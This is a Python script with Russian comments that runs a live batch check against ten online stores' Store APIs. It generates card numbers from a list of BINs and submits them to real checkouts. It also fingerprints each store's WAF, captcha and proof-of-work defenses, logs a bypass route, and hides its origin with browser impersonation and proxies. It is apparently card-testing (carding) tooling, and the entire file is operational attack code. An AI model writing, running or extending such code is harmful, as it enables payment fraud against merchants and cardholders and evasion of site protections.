# language: Python 3.12+, file: scratch/check_10_stores_section4.py, target: Windows 11
"""Лайв-проверка раздела 4: 10 магазинов Store API с защитным слоем в прод-графе.

Что проверяем боем:
  * классификатор поверхности (surface_shield + captcha_pow) реально вызывается на живых
    витринах и отдаёт waf/shields/route/pow — раньше эти модули в прод-пути не участвовали;
  * боевой прогон по тем же магазинам остаётся чистым: вердикты внутри таксономии, UNKNOWN = 0;
  * на каждой цели видно, есть ли защита и каким маршрутом она снимается.

    python scratch/check_10_stores_section4.py [--count 10] [--proxy URL]
Отчёт: data/results/check10_section4_<ts>.json
"""
from __future__ import annotations

import argparse
import asyncio
import json
import pathlib
import random
import sys
import time
from collections import Counter

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

import config
import gate_client as gc
from curl_cffi.requests import AsyncSession
from store_gate import check_target, MAX_PRICE_CENTS

POOL = ROOT / "data" / "store_targets.txt"


def load_targets(limit: int) -> list[str]:
    out = []
    for line in POOL.read_text(encoding="utf-8").splitlines():
        line = line.strip().rstrip("/")
        if not line or line.startswith("#") or not line.startswith("http"):
            continue
        out.append(line)
        if len(out) >= limit:
            break
    return out


async def surface_profile(target: str, proxy: str | None) -> dict:
    """Профиль защиты витрины — ровно тот вызов, что теперь стоит в прод-графе."""
    try:
        async with AsyncSession(impersonate=config.pick_impersonate(), verify=False, proxy=proxy) as s:
            r = await s.get(target, timeout=12, allow_redirects=True)
            prof = gc.classify_surface_challenge(r.status_code, r.text or "",
                                                 headers=dict(r.headers), url=target)
            prof["status_code"] = r.status_code
            return prof
    except Exception as e:
        return {"url": target, "error": f"{type(e).__name__}: {e}", "block": None,
                "waf": "unreachable", "shields": [], "bypass_strategy": "", "pow": {}}


async def run_one(target: str, sem: asyncio.Semaphore, proxy: str | None, results: list) -> None:
    probe = gc.gen_probe_card(random.choice(gc._PROBE_BINS))
    card = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
    async with sem:
        t0 = time.monotonic()
        prof = await surface_profile(target, proxy)
        try:
            res = await asyncio.wait_for(check_target(target, card, proxy, MAX_PRICE_CENTS), timeout=180)
        except Exception as exc:  # noqa: BLE001
            res = {"status": "ERROR", "detail": f"{type(exc).__name__}: {exc}"[:150]}
        ms = int((time.monotonic() - t0) * 1000)

    status = str(res.get("status", ""))
    rec = {
        "target": target,
        "status": status,
        "handled": status in config.VERDICTS or config.coerce_verdict(status) == "ERROR",
        "coerced": config.coerce_verdict(status),
        "detail": str(res.get("detail", ""))[:160],
        "amount_cents": res.get("amount_cents", 0),
        "currency": res.get("currency", ""),
        "card": gc.mask_pan(card),
        "latency_ms": ms,
        "surface": {
            "http": prof.get("status_code"),
            "waf": prof.get("waf"),
            "shields": prof.get("shields"),
            "block": prof.get("block"),
            "route": prof.get("bypass_strategy"),
            "pow": (prof.get("pow") or {}).get("type", ""),
            "error": prof.get("error", ""),
        },
    }
    results.append(rec)
    mark = "OK " if rec["handled"] else "!!!"
    s = rec["surface"]
    print(f"{mark} [{status:14}] waf={str(s['waf'])[:10]:10} route={str(s['route'])[:22]:22} "
          f"pow={str(s['pow'])[:10]:10} {target[:34]:34} {ms:6}ms {rec['detail'][:44]}", flush=True)


async def main() -> int:
    ap = argparse.ArgumentParser(description="Лайв-проверка раздела 4 на 10 магазинах")
    ap.add_argument("--count", type=int, default=10)
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--proxy", default=None)
    args = ap.parse_args()

    targets = load_targets(args.count)
    print("=" * 118)
    print(f"[*] РАЗДЕЛ 4 — ЛАЙВ: {len(targets)} магазинов Store API | крышка {MAX_PRICE_CENTS}c | "
          f"proxy {args.proxy or 'direct'} | конкурентность {args.concurrency}")
    print("=" * 118, flush=True)

    sem = asyncio.Semaphore(args.concurrency)
    results: list[dict] = []
    await asyncio.gather(*(run_one(t, sem, args.proxy, results) for t in targets))

    by_status = Counter(r["status"] for r in results)
    by_waf = Counter(str(r["surface"]["waf"]) for r in results)
    unknown = [r for r in results if r["coerced"] == "UNKNOWN"]
    unhandled = [r for r in results if not r["handled"]]
    protected = [r for r in results if r["surface"]["block"] or r["surface"]["pow"]]

    print("\n" + "=" * 118)
    print(f"[*] ИТОГ: {len(results)} магазинов | обработано: {len(results) - len(unhandled)} | "
          f"UNKNOWN: {len(unknown)} | с защитой на поверхности: {len(protected)}")
    print("[*] WAF/защита по витринам:", dict(by_waf))
    for st, n in by_status.most_common():
        print(f"    {config.icon(st)} {st:16} {n}")
    for r in protected:
        s = r["surface"]
        print(f"    защита: {r['target']} -> waf={s['waf']} route={s['route']} pow={s['pow'] or '-'}")
    if unhandled:
        print("[!] не обработано:")
        for r in unhandled:
            print(f"    {r['target']} -> {r['status']} | {r['detail'][:70]}")

    out = ROOT / "data" / "results"
    out.mkdir(parents=True, exist_ok=True)
    report = out / f"check10_section4_{time.strftime('%Y%m%d_%H%M%S')}.json"
    report.write_text(json.dumps({
        "total": len(results), "unhandled": len(unhandled), "unknown": len(unknown),
        "protected": len(protected), "by_status": dict(by_status), "by_waf": dict(by_waf),
        "results": sorted(results, key=lambda r: r["target"]),
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"[*] Отчёт: {report}")
    return 0 if not unhandled and not unknown else 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
